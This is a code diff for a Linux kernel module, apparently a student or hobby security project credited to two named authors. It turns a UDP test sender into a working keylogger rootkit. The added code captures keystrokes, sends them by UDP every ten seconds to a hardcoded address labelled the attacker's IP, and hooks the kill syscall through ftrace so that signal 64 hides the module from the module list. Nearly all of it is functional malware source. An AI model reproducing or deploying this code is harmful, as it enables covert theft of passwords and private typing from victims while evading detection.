@@ -19,16 +19,37 @@
 #include <linux/if_ether.h>
 #include <linux/netpoll.h>
 
-// for hiding
+// for timer
+#include <linux/interrupt.h>
+#include <linux/hrtimer.h>
+#include <linux/sched.h>
+
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
 #include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/version.h>
+#include "ftracehelper.h"
 
 #define DEBUG 0
 #define debug(args...) if(DEBUG) printk(KERN_INFO args)
 
-#define BUF_SIZE 256
+#define SRC_IP "0.0.0.0" // the victim's IP address, not important
+#define DEST_IP "192.168.1.37" // the attacker's IP address
+#define SRC_PORT 12345 // the victim's UDP port
+#define DEST_PORT 54321 // the attacker's UDP port
+
+#define EXPIRE_TIME 10 // every EXPIRE_TIME seconds, send key_buf
+
+#define BUF_SIZE 16
+
 
 static char key_buf[BUF_SIZE];
 static unsigned int key_buf_ptr;
+
+static struct hrtimer htimer;
+static ktime_t kt_periode;
 
 /* we only record ASCII characters and backspace, enter, tab, esc
  * return 1 if record the c */
@@ -98,11 +119,8 @@ static int send_key_buf(void){
     uint8_t dest_addr[ETH_ALEN];
 
     unsigned char* data;
-    char *srcIP = "10.0.2.15";
-    char *dstIP = "123.123.123.123";
-    char *hello_world = ">>> KERNEL sk_buff Hello World <<< by Dmytro Shytyi";
-    int udp_payload_len = 51;
-    int udp_total_len = UDP_HEADER_RM + udp_payload_len;
+    
+    int udp_total_len = UDP_HEADER_RM + key_buf_ptr;
     int ip_total_len = IP_HEADER_RM + udp_total_len;
     
     struct sk_buff* skb;
@@ -129,14 +147,14 @@ static int send_key_buf(void){
     //adjust headroom
     skb_reserve(skb, ETH_HLEN + IP_HEADER_RM + UDP_HEADER_RM);
 
-    data = skb_put(skb, udp_payload_len);
-    memcpy(data, hello_world, udp_payload_len);
+    data = skb_put(skb, key_buf_ptr);
+    memcpy(data, key_buf, key_buf_ptr);
 
     // udp header
     uh = (struct udphdr*)skb_push(skb, UDP_HEADER_RM);
     uh->len = htons(udp_total_len);
-    uh->source = htons(15934); // upd ports
-    uh->dest = htons(15904);
+    uh->source = htons(SRC_PORT); // udp ports
+    uh->dest = htons(DEST_PORT);
 
     // ip header
     iph = (struct iphdr*)skb_push(skb, IP_HEADER_RM);
@@ -148,8 +166,8 @@ static int send_key_buf(void){
     iph->ttl = 64; // Set a TTL.
     iph->protocol = IPPROTO_UDP; //  protocol.
     iph->check = 0;
-    iph->saddr = inet_addr(srcIP);
-    iph->daddr = inet_addr(dstIP);
+    iph->saddr = inet_addr(SRC_IP);
+    iph->daddr = inet_addr(DEST_IP);
 
     /* changing Mac address */   
     eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));//add data to the start of a buffer
@@ -189,6 +207,9 @@ int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
 
         // loop back and dump the whole buffer to the network
         if(key_buf_ptr >= BUF_SIZE) {
+            if(send_key_buf()) {
+                printk(KERN_INFO "Sending key_buf failed!\n");
+            }
             key_buf_ptr = 0;
             memset(key_buf, 0, BUF_SIZE);
         }
@@ -198,58 +219,177 @@ int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
     return NOTIFY_OK;
 }
 
+/* The timer callback that will be called periodically.
+   This function will send key_buf if key_buf_ptr != 0 */
+static enum hrtimer_restart timer_function(struct hrtimer * timer)
+{
+    // send packets
+    if(key_buf_ptr != 0) {
+        printk(KERN_INFO "Timer expires and key_buf has contents\n");
+        if(send_key_buf()) {
+            printk(KERN_INFO "Sending key_buf failed!\n");
+        }
+        key_buf_ptr = 0;
+        memset(key_buf, 0, BUF_SIZE);
+    }
+
+    hrtimer_forward_now(timer, kt_periode);
+
+    return HRTIMER_RESTART;
+}
+
+
+/* timer init */
+static void timer_init(void)
+{
+    kt_periode = ktime_set(EXPIRE_TIME, 0); //seconds, nanoseconds
+    hrtimer_init (& htimer, CLOCK_REALTIME, HRTIMER_MODE_REL);
+    htimer.function = timer_function;
+    hrtimer_start(& htimer, kt_periode, HRTIMER_MODE_REL);
+}
+
 /* notifier block in the notification chain*/
 static struct notifier_block nb = {
     .notifier_call = keylogger_cb,
 };
 
+/* After Kernel 4.17.0, the way that syscalls are handled changed
+ * to use the pt_regs struct instead of the more familiar function
+ * prototype declaration. We have to check for this, and set a
+ * variable for later on */
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+/* We need these for hiding/revealing the kernel module */
 static struct list_head *prev_module;
 static short hidden = 0;
 
+/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
+ * declare the orig_kill and hook_kill functions differently
+ * depending on the kernel version. This is the largest barrier to 
+ * getting the rootkit to work on earlier kernel versions. The
+ * more modern way is to use the pt_regs struct. */
+#ifdef PTREGS_SYSCALL_STUBS
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+/* After grabbing the sig out of the pt_regs struct, just check
+ * for signal 64 (unused normally) and, using "hidden" as a toggle
+ * we either call hideme(), showme() or the real sys_kill()
+ * syscall with the arguments passed via pt_regs. */
+asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+    void showme(void);
+    void hideme(void);
+
+    // pid_t pid = regs->di;
+    int sig = regs->si;
+
+    if ( (sig == 64) && (hidden == 0) )
+    {
+        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
+        hideme();
+        hidden = 1;
+    }
+    else if ( (sig == 64) && (hidden == 1) )
+    {
+        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
+        showme();
+        hidden = 0;
+    }
+    else
+    {
+        return orig_kill(regs);
+    }
+    return 0;
+}
+#else
+/* This is the old way of declaring a syscall hook */
+static asmlinkage long (*orig_kill)(pid_t pid, int sig);
+
+static asmlinkage int hook_kill(pid_t pid, int sig)
+{
+    void showme(void);
+    void hideme(void);
+
+    if ( (sig == 64) && (hidden == 0) )
+    {
+        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
+        hideme();
+        hidden = 1;
+    }
+    else if ( (sig == 64) && (hidden == 1) )
+    {
+        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
+        showme();
+        hidden = 0;
+    }
+    else
+    {
+        return orig_kill(pid, sig);
+    }
+    return 0;
+}
+#endif
+
+/* Add this LKM back to the loaded module list, at the point
+ * specified by prev_module */
 void showme(void)
 {
-    /* Add the saved list_head struct back to the module list */
     list_add(&THIS_MODULE->list, prev_module);
-    hidden = 0;
 }
 
+/* Record where we are in the loaded module list by storing
+ * the module prior to us in prev_module, then remove ourselves
+ * from the list */
 void hideme(void)
 {
-    /* Save the module in the list before us, so we can add ourselves
-     * back to the list in the same place later. */
     prev_module = THIS_MODULE->list.prev;
-    /* Remove ourselves from the list module list */
     list_del(&THIS_MODULE->list);
-    hidden = 1;
 }
 
-
-// should try ftrace to hook the syscalls
+/* Declare the struct that ftrace needs to hook the syscall */
+static struct ftrace_hook hooks[] = {
+    HOOK("sys_kill", hook_kill, &orig_kill),
+};
 
 /* init function */
 static int keylogger_init(void)
 {
-    hideme(); //hides from lsmod, but we cannot unload it yet
-
+    /* Hook the syscall and print to the kernel buffer */
+    int err;
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(err)
+        return err;
+    
     printk(KERN_INFO "Keylogger is loaded!\n");
     memset(key_buf, 0, BUF_SIZE);
     key_buf_ptr = 0;
     register_keyboard_notifier(&nb);
-    send_key_buf();// for testing
+    timer_init();
+    //send_key_buf();// for testing
     return 0;
+}
+
+/* timer cleanup */
+static void timer_cleanup(void)
+{
+    hrtimer_cancel(& htimer);
 }
 
 /* exit function */
 static void keylogger_exit(void)
 {
+    /* Unhook and restore the syscall and print to the kernel buffer */
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+
     unregister_keyboard_notifier(&nb);
+    timer_cleanup();
     printk(KERN_INFO "Keylogger is unloaded!\n");
 }
 
-
 module_init(keylogger_init);
 module_exit(keylogger_exit);
-
 
 MODULE_LICENSE ("GPL");
 MODULE_AUTHOR ("Richard Wu, Jingyu Yao");
